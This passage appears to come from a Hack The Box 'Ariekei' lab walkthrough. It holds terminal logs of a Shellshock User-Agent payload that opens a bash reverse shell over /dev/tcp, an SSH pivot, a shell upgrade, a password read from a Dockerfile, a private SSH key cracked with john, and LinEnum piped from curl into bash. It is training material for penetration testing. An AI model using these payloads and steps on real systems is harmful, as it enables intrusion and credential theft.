drwxr-xr-x 6 root root 4.0K Sep 23  2017 ..
-rw-r--r-- 1 root root   38 Sep 23  2017 Dockerfile
drwxr-xr-x 4 root root 4.0K Jun  5 19:56 app
-rwxr-xr-x 1 root root   35 Sep 23  2017 build.sh
-rwxr-x--x 1 root root  260 Nov 13  2017 start.sh
root@ezra:/common/containers/convert-live# cat start.sh
docker run \
-v /dev/null:/root/.sh_history \
-v /dev/null:/root/.bash_history \
--restart on-failure:5 \
--net arieka-live-net --ip 172.23.0.11 \
-h calvin.ariekei.htb --name convert-live -dit \
-v $(pwd)/app:/app \
-v /opt/docker:/common:ro convert-template
root@ezra:/common/containers/convert-live# cd ../blog-test/
root@ezra:/common/containers/blog-test# ls -lah
total 32K
drwxr-xr-x 5 root  999 4.0K Nov 13  2017 .
drwxr-xr-x 6 root root 4.0K Sep 23  2017 ..
-rw-r--r-- 1 root  999  144 Sep 23  2017 Dockerfile
-rwxr--r-- 1 root  999   32 Sep 16  2017 build.sh
drwxr-xr-x 2 root root 4.0K Sep 26  2017 cgi
drwxr-xr-x 7 root  999 4.0K Sep 26  2017 config
drwxr-xr-x 2 root root 4.0K Jun  4 03:00 logs
-rwxrwx--x 1 root  999  386 Nov 13  2017 start.sh
root@ezra:/common/containers/blog-test# cat start.sh
docker run \
-v /dev/null:/root/.sh_history \
-v /dev/null:/root/.bash_history \
--restart on-failure:5 \
--net arieka-test-net --ip 172.24.0.2 \
-h beehive.ariekei.htb --name blog-test -dit \
-v /opt/docker:/common:ro \
-v $(pwd)/cgi:/usr/lib/cgi-bin:ro \
-v $(pwd)/config:/etc/apache2:ro \
-v $(pwd)/logs:/var/log/apache2 \
-v /home/spanishdancer:/home/spanishdancer:ro  web-template
root@ezra:/common/containers/blog-test#
root@ezra:/common/containers/blog-test# cd config/
root@ezra:/common/containers/blog-test/config# ls -lah
total 80K
drwxr-xr-x 7 root 999 4.0K Sep 26  2017 .
drwxr-xr-x 5 root 999 4.0K Nov 13  2017 ..
-rw-r--r-- 1 root 999 9.5K Sep 26  2017 apache2.conf
drwxr-xr-x 2 root 999 4.0K Aug  4  2015 conf.d
-rw-r--r-- 1 root 999 1.5K Aug  1  2015 envvars
-rw-r--r-- 1 root 999  31K Apr 28  2015 magic
drwxr-xr-x 2 root 999 4.0K Aug  4  2015 mods-available
drwxr-xr-x 2 root 999 4.0K Aug  4  2015 mods-enabled
-rw-r--r-- 1 root 999  750 Aug  1  2015 ports.conf
drwxr-xr-x 2 root 999 4.0K Sep 22  2017 sites-available
drwxr-xr-x 2 root 999 4.0K Sep 22  2017 sites-enabled
root@ezra:/common/containers/blog-test/config#
root@ezra:/common/containers/blog-test/config# cd sites-available/
root@ezra:/common/containers/blog-test/config/sites-available# ls -lah
total 20K
drwxr-xr-x 2 root 999 4.0K Sep 22  2017 .
drwxr-xr-x 7 root 999 4.0K Sep 26  2017 ..
-rw-r--r-- 1 root 999  711 Sep 22  2017 default
-rw-r--r-- 1 root 999 7.1K Aug  1  2015 default-ssl
root@ezra:/common/containers/blog-test/config/sites-available# cat default
<VirtualHost *:80>
	ServerAdmin webmaster@localhost

	DocumentRoot /home/spanishdancer/content
	<Directory />
		Options FollowSymLinks
		AllowOverride None
	</Directory>
	<Directory /var/www/>
		Options Indexes FollowSymLinks MultiViews
		AllowOverride None
		Order allow,deny
		allow from all
	</Directory>

	ScriptAlias /cgi-bin/ /usr/lib/cgi-bin/
	<Directory "/usr/lib/cgi-bin">
		AllowOverride None
		Options +ExecCGI -MultiViews +SymLinksIfOwnerMatch
		Order allow,deny
		Allow from all
	</Directory>

	ErrorLog ${APACHE_LOG_DIR}/error.log

	# Possible values include: debug, info, notice, warn, error, crit,
	# alert, emerg.
	LogLevel warn

	CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>
root@ezra:/common/containers/blog-test/config/sites-available#
root@ezra:/common/containers/blog-test/config/sites-available# cd /
root@ezra:/# wget http://172.24.0.2
--2018-06-05 20:20:06--  http://172.24.0.2/
Connecting to 172.24.0.2:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 487 [text/html]
Saving to: 'index.html'

100%[==================================================================================================================================================================>] 487         --.-K/s   in 0s

2018-06-05 20:20:06 (114 MB/s) - 'index.html' saved [487/487]

root@ezra:/#
root@ezra:/# rm index.html
```

```sh
root@ezra:/# wget --user-agent='() { :;}; echo; echo; /usr/bin/whoami' 172.24.0.2/cgi-bin/stats
--2018-06-05 21:27:49--  http://172.24.0.2/cgi-bin/stats
Connecting to 172.24.0.2:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: unspecified
Saving to: 'stats'

    [ <=>                                                                                                                                                               ] 10          --.-K/s   in 0.002s

2018-06-05 21:27:50 (5.83 KB/s) - 'stats' saved [10]

root@ezra:/# ls
bin  boot  common  dev  etc  home  lib  lib64  media  mnt  opt  proc  root  run  sbin  srv  stats  sys  tmp  usr  var
root@ezra:/# cat stats

www-data
root@ezra:/#
```

###### Local Port Forwarding

```
~ + C
```

```sh
root@ezra:/#
ssh> help
Commands:
      -L[bind_address:]port:host:hostport    Request local forward
      -R[bind_address:]port:host:hostport    Request remote forward
      -D[bind_address:]port                  Request dynamic forward
      -KL[bind_address:]port                 Cancel local forward
      -KR[bind_address:]port                 Cancel remote forward
      -KD[bind_address:]port                 Cancel dynamic forward

root@ezra:/#
```

```sh
root@kali:~/ariekei# ssh -i bastion_key 10.10.10.65 -p 1022 -L 80:172.24.0.2:80
Last login: Mon Nov 13 15:20:19 2017 from 10.10.14.2
root@ezra:~#
```

[`Using the SSH "Konami Code" (SSH Control Sequences)`](https://pen-testing.sans.org/blog/2015/11/10/protected-using-the-ssh-konami-code-ssh-control-sequences)

```sh
root@kali:~/ariekei# ssh -i bastion_key 10.10.10.65 -p 1022
Last login: Tue Jun  5 23:37:14 2018 from 10.10.14.16
root@ezra:~# nc -nlvp 1234
Listening on [0.0.0.0] (family 0, port 1234)
Connection from [172.24.0.1] port 1234 [tcp/*] accepted (family 2, sport 52944)
www-data@beehive:/usr/lib/cgi-bin$
```

```sh
root@kali:~/ariekei# curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'bash -i >& /dev/tcp/172.24.0.253/1234 0>&1;'" http://localhost/cgi-bin/stats
```

```sh
www-data@beehive:/usr/lib/cgi-bin$ cat /common/containers/blog-test/Dockerfile
<gi-bin$ cat /common/containers/blog-test/Dockerfile
FROM internal_htb/docker-apache
RUN echo "root:Ib3!kTEvYw6*P7s" | chpasswd
RUN apt-get update
RUN apt-get install python -y
RUN mkdir /common
www-data@beehive:/usr/lib/cgi-bin$
```

[`Upgrading simple shells to fully interactive TTYs`](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/)

```sh
www-data@beehive:/usr/lib/cgi-bin$ python -c 'import pty; pty.spawn("/bin/bash")'
<gi-bin$ python -c 'import pty; pty.spawn("/bin/bash")'
www-data@beehive:/usr/lib/cgi-bin$ ^Z
[1]+  Stopped                 nc -nlvp 1234
root@ezra:~# echo $TERM
xterm-256color
root@ezra:~# stty -a
speed 38400 baud; rows 51; columns 204; line = 0;
intr = ^C; quit = ^\; erase = ^?; kill = ^U; eof = ^D; eol = M-^?; eol2 = M-^?; swtch = <undef>; start = ^Q; stop = ^S; susp = ^Z; rprnt = ^R; werase = ^W; lnext = ^V; flush = ^O; min = 1; time = 0;
-parenb -parodd cs8 -hupcl -cstopb cread -clocal -crtscts
-ignbrk -brkint -ignpar -parmrk -inpck -istrip -inlcr -igncr icrnl ixon -ixoff -iuclc ixany imaxbel -iutf8
opost -olcuc -ocrnl onlcr -onocr -onlret -ofill -ofdel nl0 cr0 tab0 bs0 vt0 ff0
isig icanon iexten echo echoe echok -echonl -noflsh -xcase -tostop -echoprt echoctl echoke
root@ezra:~# stty raw -echo
root@ezra:~# nc -nlvp 1234
                          reset
reset: unknown terminal type unknown
Terminal type? xterm-256color

www-data@beehive:/usr/lib/cgi-bin$ export SHELL=bash
www-data@beehive:/usr/lib/cgi-bin$ srry rows 51 columns 204
bash: srry: command not found
www-data@beehive:/usr/lib/cgi-bin$
```

```sh
www-data@beehive:/usr/lib/cgi-bin$ su -
Password:
root@beehive:~# cd /home/
root@beehive:/home# ls
spanishdancer
root@beehive:/home# cd spanishdancer/
root@beehive:/home/spanishdancer# ls
content  user.txt
root@beehive:/home/spanishdancer# cat user.txt
ff0bca827a5f660f6d35df7481e5f216
root@beehive:/home/spanishdancer#
```

###### SSH access to spanishdancer

```sh
root@beehive:/home/spanishdancer# ls -lah
total 40K
drwxr-xr-x 5 1000 1000 4.0K Nov 13  2017 .
drwxr-xr-x 3 root root 4.0K Nov 13  2017 ..
-rw-r--r-- 1 1000 1000 3.8K Sep 24  2017 .bashrc
drwx------ 2 1000 1000 4.0K Sep 24  2017 .cache
-rw------- 1 1000 1000   33 Nov  5  2017 .lesshst
-rw-r--r-- 1 1000 1000  655 Sep 16  2017 .profile
drwx------ 2 1000 1000 4.0K Sep 24  2017 .ssh
-rw------- 1 1000 1000  728 Nov 13  2017 .viminfo
drwxrwxr-x 3 1000 root 4.0K Sep 16  2017 content
-r--r----- 1 1000 root   33 Sep 24  2017 user.txt
root@beehive:/home/spanishdancer# cd .ssh/
root@beehive:/home/spanishdancer/.ssh# ls -lah
total 20K
drwx------ 2 1000 1000 4.0K Sep 24  2017 .
drwxr-xr-x 5 1000 1000 4.0K Nov 13  2017 ..
-rw-rw-r-- 1 1000 1000  407 Sep 24  2017 authorized_keys
-rw------- 1 1000 1000 1.8K Sep 24  2017 id_rsa
-rw-r--r-- 1 1000 1000  407 Sep 24  2017 id_rsa.pub
root@beehive:/home/spanishdancer/.ssh# cat id_rsa
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,C3EBD8120354A75E12588B11180E96D5

2UIvlsa0jCjxKXmQ4vVX6Ez0ak+6r5VuZFFoalVXvbZSLomIya4vYETv1Oq8EPeh
KHjq5wFdlYdOXqyJus7vFtB9nbCUrgH/a3og0/6e8TA46FuP1/sFMV67cdTlXfYI
Y4sGV/PS/uLm6/tcEpmGiVdcUJHpMECZvnx9aSa/kvuO5pNfdFvnQ4RVA8q/w6vN
p3pDI9CzdnkYmH5/+/QYFsvMk4t1HB5AKO5mRrc1x+QZBhtUDNVAaCu2mnZaSUhE
abZo0oMZHG8sETBJeQRnogPyAjwmAVFy5cDTLgag9HlFhb7MLgq0dgN+ytid9YA8
pqTtx8M98RDhVKqcVG3kzRFc/lJBFKa7YabTBaDoWryR0+6x+ywpaBGsUXEoz6hU
UvLWH134w8PGuR/Rja64s0ZojGYsnHIl05PIntvl9hinDNc0Y9QOmKde91NZFpcj
pDlNoISCc3ONnL4c7xgS5D2oOx+3l2MpxB+B9ua/UNJwccDdJUyoJEnRt59dH1g3
cXvb/zTEklwG/ZLed3hWUw/f71D9DZV+cnSlb9EBWHXvSJwqT1ycsvJRZTSRZeOF
Bh9auWqAHk2SZ61kcXOp+W91O2Wlni2MCeYjLuw6rLUHUcEnUq0zD9x6mRNLpzp3
IC8VFmW03ERheVM6Ilnr8HOcOQnPHgYM5iTM79X70kCWoibACDuEHz/nf6tuLGbv
N01CctfSE+JgoNIIdb4SHxTtbOvUtsayQmV8uqzHpCQ3FMfz6uRvl4ZVvNII/x8D
u+hRPtQ1690Eg9sWqu0Uo87/v6c/XJitNYzDUOmaivoIpL0RO6mu9AhXcBnqBu3h
oPSgeji9U7QJD64T8InvB7MchfaJb9W/VTECST3FzAFPhCe66ZRzRKZSgMwftTi5
hm17wPBuLjovOCM8QWp1i32IgcdrnZn2pBpt94v8/KMwdQyAOOVhkozBNS6Xza4P
18yUX3UiUEP9cmtz7bTRP5h5SlDzhprntaKRiFEHV5SS94Eri7Tylw4KBlkF8lSD
WZmJvAQc4FN+mhbaxagCadCf12+VVNrB3+vJKoUHgaRX+R4P8H3OTKwub1e69vnn
QhChPHmH9SrI2TNsP9NPT5geuTe0XPP3Og3TVzenG7DRrx4Age+0TrMShcMeJQ8D
s3kAiqHs5liGqTG96i1HeqkPms9dTC895Ke0jvIFkQgxPSB6y7oKi7VGs15vs1au
9T6xwBLJQSqMlPewvUUtvMQAdNu5eksupuqBMiJRUQvG9hD0jjXz8f5cCCdtu8NN
8Gu4jcZFmVvsbRCP8rQBKeqc/rqe0bhCtvuMhnl7rtyuIw2zAAqqluFs8zL6YrOw
lBLLZzo0vIfGXV42NBPgSJtc9XM3YSTjbdAk+yBNIK9GEVTbkO9GcMgVaBg5xt+6
uGE5dZmtyuGyD6lj1lKk8D7PbCHTBc9MMryKYnnWt7CuxFDV/Jp4fB+/DuPYL9YQ
8RrdIpShQKh189lo3dc6J00LmCUU5qEPLaM+AGFhpk99010rrZB/EHxmcI0ROh5T
1oSM+qvLUNfJKlvqdRQr50S1OjV+9WrmR0uEBNiNxt2PNZzY/Iv+p8uyU1+hOWcz
-----END RSA PRIVATE KEY-----
root@beehive:/home/spanishdancer/.ssh# cat id_rsa.pub
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC325QNrOHp+Ob93i/XR2XkXZ1k/ypSbKhdcKB2CQLNW1jXp+CKnb5wmin/hEJ8u3Crm5YsFjg/K/x6hBDa0TwpwQxIZ7y1JbWFXL3XRdvpi6YrIMdUwGs3lCAUwJhazVnOUAY92EnoLdQlbPgXT4gVxMfW37YDBC3Gg2YJRKUkrDaYsI9oxvGMU1vmigb/0Ck/+kG/n0yOa0NBb2orEwQYoqX1cW4PnuTmR7bD53PsWmNcYhLxSvd783tz9Q/Np7q9/ziPo2QCN1R0fY7UykmASA1hedfI6C2mUKaETN4vKnfVeppb5m7wXhkSlYULE5PcmXuGoYCD6WtwAzPiwb1r spanishdancer@ariekei.htb
root@beehive:/home/spanishdancer/.ssh#
```

```sh
root@kali:~/ariekei# vi spanishdanver-id-rsa
root@kali:~/ariekei# cat spanishdanver-id-rsa
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,C3EBD8120354A75E12588B11180E96D5

2UIvlsa0jCjxKXmQ4vVX6Ez0ak+6r5VuZFFoalVXvbZSLomIya4vYETv1Oq8EPeh
KHjq5wFdlYdOXqyJus7vFtB9nbCUrgH/a3og0/6e8TA46FuP1/sFMV67cdTlXfYI
Y4sGV/PS/uLm6/tcEpmGiVdcUJHpMECZvnx9aSa/kvuO5pNfdFvnQ4RVA8q/w6vN
p3pDI9CzdnkYmH5/+/QYFsvMk4t1HB5AKO5mRrc1x+QZBhtUDNVAaCu2mnZaSUhE
abZo0oMZHG8sETBJeQRnogPyAjwmAVFy5cDTLgag9HlFhb7MLgq0dgN+ytid9YA8
pqTtx8M98RDhVKqcVG3kzRFc/lJBFKa7YabTBaDoWryR0+6x+ywpaBGsUXEoz6hU
UvLWH134w8PGuR/Rja64s0ZojGYsnHIl05PIntvl9hinDNc0Y9QOmKde91NZFpcj
pDlNoISCc3ONnL4c7xgS5D2oOx+3l2MpxB+B9ua/UNJwccDdJUyoJEnRt59dH1g3
cXvb/zTEklwG/ZLed3hWUw/f71D9DZV+cnSlb9EBWHXvSJwqT1ycsvJRZTSRZeOF
Bh9auWqAHk2SZ61kcXOp+W91O2Wlni2MCeYjLuw6rLUHUcEnUq0zD9x6mRNLpzp3
IC8VFmW03ERheVM6Ilnr8HOcOQnPHgYM5iTM79X70kCWoibACDuEHz/nf6tuLGbv
N01CctfSE+JgoNIIdb4SHxTtbOvUtsayQmV8uqzHpCQ3FMfz6uRvl4ZVvNII/x8D
u+hRPtQ1690Eg9sWqu0Uo87/v6c/XJitNYzDUOmaivoIpL0RO6mu9AhXcBnqBu3h
oPSgeji9U7QJD64T8InvB7MchfaJb9W/VTECST3FzAFPhCe66ZRzRKZSgMwftTi5
hm17wPBuLjovOCM8QWp1i32IgcdrnZn2pBpt94v8/KMwdQyAOOVhkozBNS6Xza4P
18yUX3UiUEP9cmtz7bTRP5h5SlDzhprntaKRiFEHV5SS94Eri7Tylw4KBlkF8lSD
WZmJvAQc4FN+mhbaxagCadCf12+VVNrB3+vJKoUHgaRX+R4P8H3OTKwub1e69vnn
QhChPHmH9SrI2TNsP9NPT5geuTe0XPP3Og3TVzenG7DRrx4Age+0TrMShcMeJQ8D
s3kAiqHs5liGqTG96i1HeqkPms9dTC895Ke0jvIFkQgxPSB6y7oKi7VGs15vs1au
9T6xwBLJQSqMlPewvUUtvMQAdNu5eksupuqBMiJRUQvG9hD0jjXz8f5cCCdtu8NN
8Gu4jcZFmVvsbRCP8rQBKeqc/rqe0bhCtvuMhnl7rtyuIw2zAAqqluFs8zL6YrOw
lBLLZzo0vIfGXV42NBPgSJtc9XM3YSTjbdAk+yBNIK9GEVTbkO9GcMgVaBg5xt+6
uGE5dZmtyuGyD6lj1lKk8D7PbCHTBc9MMryKYnnWt7CuxFDV/Jp4fB+/DuPYL9YQ
8RrdIpShQKh189lo3dc6J00LmCUU5qEPLaM+AGFhpk99010rrZB/EHxmcI0ROh5T
1oSM+qvLUNfJKlvqdRQr50S1OjV+9WrmR0uEBNiNxt2PNZzY/Iv+p8uyU1+hOWcz
-----END RSA PRIVATE KEY-----
root@kali:~/ariekei#
```

```sh
root@kali:~/ariekei# ssh2john spanishdanver-id-rsa > spanishdanver-id-rsa.john
root@kali:~/ariekei# john spanishdanver-id-rsa.john
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA 32/64])
Press 'q' or Ctrl-C to abort, almost any other key for status
purple1          (spanishdanver-id-rsa)
1g 0:00:00:00 DONE 2/3 (2018-06-05 19:54) 16.66g/s 387800p/s 387800c/s 387800C/s purple1
Use the "--show" option to display all of the cracked passwords reliably
Session completed
root@kali:~/ariekei#
```

```sh
root@kali:~/ariekei# chmod 600 spanishdanver-id-rsa
```

```sh
root@kali:~/ariekei# ssh -i spanishdanver-id-rsa spanishdancer@10.10.10.65
Enter passphrase for key 'spanishdanver-id-rsa':
Welcome to Ubuntu 16.04.3 LTS (GNU/Linux 4.4.0-87-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

7 packages can be updated.
7 updates are security updates.


Last login: Mon Nov 13 10:23:41 2017 from 10.10.14.2
spanishdancer@ariekei:~$
```

```sh
spanishdancer@ariekei:~$ ifconfig
br-6a905a084b79 Link encap:Ethernet  HWaddr 02:42:1c:55:42:6b
          inet addr:172.23.0.1  Bcast:0.0.0.0  Mask:255.255.255.0
          inet6 addr: fe80::42:1cff:fe55:426b/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:452 errors:0 dropped:0 overruns:0 frame:0
          TX packets:602 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0
          RX bytes:69344 (69.3 KB)  TX bytes:58329 (58.3 KB)

br-cad56989cd1a Link encap:Ethernet  HWaddr 02:42:94:cf:f0:fa
          inet addr:172.24.0.1  Bcast:0.0.0.0  Mask:255.255.255.0
          inet6 addr: fe80::42:94ff:fecf:f0fa/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:14 errors:0 dropped:0 overruns:0 frame:0
          TX packets:19 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0
          RX bytes:392 (392.0 B)  TX bytes:1122 (1.1 KB)

docker0   Link encap:Ethernet  HWaddr 02:42:2a:cf:cc:f8
          inet addr:172.17.0.1  Bcast:0.0.0.0  Mask:255.255.0.0
          inet6 addr: fe80::42:2aff:fecf:ccf8/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:0 errors:0 dropped:0 overruns:0 frame:0
          TX packets:8 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0
          RX bytes:0 (0.0 B)  TX bytes:648 (648.0 B)

ens33     Link encap:Ethernet  HWaddr 00:50:56:8f:65:24
          inet addr:10.10.10.65  Bcast:10.10.10.255  Mask:255.255.255.0
          inet6 addr: fe80::250:56ff:fe8f:6524/64 Scope:Link
          inet6 addr: dead:beef::250:56ff:fe8f:6524/64 Scope:Global
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:785 errors:0 dropped:0 overruns:0 frame:0
          TX packets:1325 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000
          RX bytes:79945 (79.9 KB)  TX bytes:136857 (136.8 KB)

lo        Link encap:Local Loopback
          inet addr:127.0.0.1  Mask:255.0.0.0
          inet6 addr: ::1/128 Scope:Host
          UP LOOPBACK RUNNING  MTU:65536  Metric:1
          RX packets:257 errors:0 dropped:0 overruns:0 frame:0
          TX packets:257 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1
          RX bytes:36327 (36.3 KB)  TX bytes:36327 (36.3 KB)

veth1f38ce7 Link encap:Ethernet  HWaddr 36:af:2d:38:5a:1f
          inet6 addr: fe80::34af:2dff:fe38:5a1f/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:556 errors:0 dropped:0 overruns:0 frame:0
          TX packets:439 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0
          RX bytes:37699 (37.6 KB)  TX bytes:37233 (37.2 KB)

veth2af0134 Link encap:Ethernet  HWaddr ba:c5:85:b1:81:06
          inet6 addr: fe80::b8c5:85ff:feb1:8106/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:0 errors:0 dropped:0 overruns:0 frame:0
          TX packets:16 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0
          RX bytes:0 (0.0 B)  TX bytes:1296 (1.2 KB)

veth30344cd Link encap:Ethernet  HWaddr 0e:40:af:17:18:e8
          inet6 addr: fe80::c40:afff:fe17:18e8/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:0 errors:0 dropped:0 overruns:0 frame:0
          TX packets:15 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0
          RX bytes:0 (0.0 B)  TX bytes:1206 (1.2 KB)

veth51c7660 Link encap:Ethernet  HWaddr ce:ea:07:1a:48:27
          inet6 addr: fe80::ccea:7ff:fe1a:4827/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:452 errors:0 dropped:0 overruns:0 frame:0
          TX packets:584 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0
          RX bytes:40904 (40.9 KB)  TX bytes:39755 (39.7 KB)

vetha434322 Link encap:Ethernet  HWaddr f6:4c:58:be:a2:4d
          inet6 addr: fe80::f44c:58ff:febe:a24d/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:372 errors:0 dropped:0 overruns:0 frame:0
          TX packets:542 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0
          RX bytes:53682 (53.6 KB)  TX bytes:50356 (50.3 KB)

vethac70906 Link encap:Ethernet  HWaddr aa:5f:06:af:1d:a6
          inet6 addr: fe80::a85f:6ff:feaf:1da6/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:20 errors:0 dropped:0 overruns:0 frame:0
          TX packets:31 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0
          RX bytes:1412 (1.4 KB)  TX bytes:3056 (3.0 KB)

vethb1bae94 Link encap:Ethernet  HWaddr 8e:7b:d2:46:ae:a0
          inet6 addr: fe80::8c7b:d2ff:fe46:aea0/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:70 errors:0 dropped:0 overruns:0 frame:0
          TX packets:79 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0
          RX bytes:22100 (22.1 KB)  TX bytes:9363 (9.3 KB)

vethbffc5b4 Link encap:Ethernet  HWaddr 2a:a8:48:4c:a7:43
          inet6 addr: fe80::28a8:48ff:fe4c:a743/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:53 errors:0 dropped:0 overruns:0 frame:0
          TX packets:74 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0
          RX bytes:4227 (4.2 KB)  TX bytes:10899 (10.8 KB)

spanishdancer@ariekei:~$
```

###### Privilege Escalation

```sh
root@kali:~/ariekei# wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
--2018-06-05 20:06:08--  https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 151.101.0.133, 151.101.64.133, 151.101.128.133, ...
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|151.101.0.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 43488 (42K) [text/plain]
Saving to: ‘LinEnum.sh’

LinEnum.sh                                         100%[================================================================================================================>]  42.47K  --.-KB/s    in 0.03s

2018-06-05 20:06:09 (1.47 MB/s) - ‘LinEnum.sh’ saved [43488/43488]

root@kali:~/ariekei#
```

```sh
root@kali:~/ariekei# python -m SimpleHTTPServer
Serving HTTP on 0.0.0.0 port 8000 ...
10.10.10.65 - - [05/Jun/2018 20:07:01] "GET /LinEnum.sh HTTP/1.1" 200 -
```

```sh
spanishdancer@ariekei:~$ curl http://10.10.14.16:8000/LinEnum.sh | bash
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 43488  100 43488    0     0  46114      0 --:--:-- --:--:-- --:--:-- 46165

#########################################################
# Local Linux Enumeration & Privilege Escalation Script #
#########################################################
# www.rebootuser.com
# version 0.9

[-] Debug Info
[+] Thorough tests = Disabled (SUID/GUID checks will not be perfomed!)


Scan started at:
Tue Jun  5 20:06:36 EDT 2018


### SYSTEM ##############################################
[-] Kernel information:
Linux ariekei.htb 4.4.0-87-generic #110-Ubuntu SMP Tue Jul 18 12:55:35 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux


[-] Kernel information (continued):
Linux version 4.4.0-87-generic (buildd@lcy01-31) (gcc version 5.4.0 20160609 (Ubuntu 5.4.0-6ubuntu1~16.04.4) ) #110-Ubuntu SMP Tue Jul 18 12:55:35 UTC 2017


[-] Specific release information:
DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=16.04
DISTRIB_CODENAME=xenial
DISTRIB_DESCRIPTION="Ubuntu 16.04.3 LTS"
NAME="Ubuntu"
VERSION="16.04.3 LTS (Xenial Xerus)"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu 16.04.3 LTS"
VERSION_ID="16.04"
HOME_URL="http://www.ubuntu.com/"
SUPPORT_URL="http://help.ubuntu.com/"
BUG_REPORT_URL="http://bugs.launchpad.net/ubuntu/"
VERSION_CODENAME=xenial
UBUNTU_CODENAME=xenial


[-] Hostname:
ariekei.htb


### USER/GROUP ##########################################
[-] Current user/group info:
uid=1000(spanishdancer) gid=1000(spanishdancer) groups=1000(spanishdancer),999(docker)


[-] Users that have previously logged onto the system:
Username         Port     From             Latest
root             tty1                      Sun Feb 11 12:47:21 -0500 2018
spanishdancer    pts/0    10.10.14.16      Tue Jun  5 19:55:52 -0400 2018


[-] Who else is logged on:
 20:06:36 up 32 min,  1 user,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
spanishd pts/0    10.10.14.16      19:55    4.00s  0.68s  0.00s bash


[-] Group memberships:
uid=0(root) gid=0(root) groups=0(root)
uid=1(daemon) gid=1(daemon) groups=1(daemon)
uid=2(bin) gid=2(bin) groups=2(bin)
uid=3(sys) gid=3(sys) groups=3(sys)
uid=4(sync) gid=65534(nogroup) groups=65534(nogroup)
uid=5(games) gid=60(games) groups=60(games)
uid=6(man) gid=12(man) groups=12(man)
uid=7(lp) gid=7(lp) groups=7(lp)
uid=8(mail) gid=8(mail) groups=8(mail)
uid=9(news) gid=9(news) groups=9(news)
uid=10(uucp) gid=10(uucp) groups=10(uucp)
uid=13(proxy) gid=13(proxy) groups=13(proxy)
uid=33(www-data) gid=33(www-data) groups=33(www-data)
uid=34(backup) gid=34(backup) groups=34(backup)
uid=38(list) gid=38(list) groups=38(list)
uid=39(irc) gid=39(irc) groups=39(irc)
uid=41(gnats) gid=41(gnats) groups=41(gnats)
uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
uid=100(systemd-timesync) gid=102(systemd-timesync) groups=102(systemd-timesync)
uid=101(systemd-network) gid=103(systemd-network) groups=103(systemd-network)
uid=102(systemd-resolve) gid=104(systemd-resolve) groups=104(systemd-resolve)
uid=103(systemd-bus-proxy) gid=105(systemd-bus-proxy) groups=105(systemd-bus-proxy)
uid=104(syslog) gid=108(syslog) groups=108(syslog),4(adm)
uid=105(_apt) gid=65534(nogroup) groups=65534(nogroup)
uid=106(lxd) gid=65534(nogroup) groups=65534(nogroup)
uid=107(messagebus) gid=111(messagebus) groups=111(messagebus)
uid=108(uuidd) gid=112(uuidd) groups=112(uuidd)
uid=109(dnsmasq) gid=65534(nogroup) groups=65534(nogroup)
uid=110(sshd) gid=65534(nogroup) groups=65534(nogroup)
uid=1000(spanishdancer) gid=1000(spanishdancer) groups=1000(spanishdancer),999(docker)


[-] It looks like we have some admin users:
uid=104(syslog) gid=108(syslog) groups=108(syslog),4(adm)


[-] Contents of /etc/passwd:
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
